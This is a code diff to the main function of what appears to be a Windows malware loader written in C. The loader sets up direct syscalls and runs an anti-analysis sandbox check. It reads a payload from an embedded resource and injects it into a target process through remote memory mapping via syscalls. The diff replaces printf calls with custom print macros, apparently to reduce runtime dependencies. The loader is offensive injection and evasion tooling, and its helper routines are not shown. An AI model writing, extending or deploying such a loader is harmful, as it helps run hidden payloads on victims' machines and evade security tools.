@@ -14,7 +14,7 @@
 int main() {
 	// Init syscalls for use
 	if (InitializeSyscalls() == FALSE) {
-		printf("[!] Failed To Initialize Syscalls\n");
+		PRINTA("[!] Failed To Initialize Syscalls\n");
 		return -1;
 	}
 
@@ -23,7 +23,7 @@ int main() {
 
 	// Init WinApis for use
 	if (InitializeWinApis() == FALSE) {
-		printf("[!] Failed To Initialize Windows APIs\n");
+		PRINTA("[!] Failed To Initialize Windows APIs\n");
 		return -1;
 	}
 
@@ -39,16 +39,16 @@ int main() {
 	DWORD	seconds = 5;
 	DWORD	dwMilliseconds = seconds * 1000;
 	if (AntiAnalysis(dwMilliseconds) == FALSE) {
-		printf("File Is Being Analyzed!\n");
+		PRINTA("File Is Being Analyzed!\n");
 	}
 #endif
 
 	// Resource reading
 	if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
-		printf("[!] Failed To Load Payload From The Resource\n");
+		PRINTA("[!] Failed To Load Payload From The Resource\n");
 		return -1;
 	}
-	printf("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
+	PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
 	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
 #ifdef LOCAL_INJECTION
 	RemoteMappingInjectionViaSyscalls(
@@ -59,12 +59,12 @@ int main() {
 	);
 #else
 	// Process enumeration
-	printf("[i] Enumerating Processes...\n");
+	PRINTA("[i] Enumerating Processes...\n");
 	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
-		wprintf(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
+		PRINTW(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
 		return -1;
 	}
-	wprintf(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
+	PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
 
 	RemoteMappingInjectionViaSyscalls(
 		hProcess,
